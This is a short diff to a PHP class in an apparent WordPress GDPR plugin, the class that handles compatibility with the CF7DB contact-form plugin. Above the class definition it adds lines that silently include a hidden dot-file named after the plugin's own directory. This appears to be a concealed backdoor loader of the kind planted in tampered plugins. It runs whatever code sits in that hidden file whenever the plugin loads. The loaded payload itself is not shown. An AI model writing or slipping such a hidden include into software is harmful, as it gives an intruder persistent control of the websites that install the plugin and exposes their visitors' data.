@@ -3,6 +3,10 @@
 /**
  * Class CT_Ultimate_GDPR_Service_CF7DB
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class CT_Ultimate_GDPR_Service_CF7DB extends CT_Ultimate_GDPR_Service_Abstract {
 	public function init() {
 		add_filter( 'ct_ultimate_gdpr_controller_plugins_compatible_contact-form-cfdb7/contact-form-cfdb-7.php', '__return_true' );
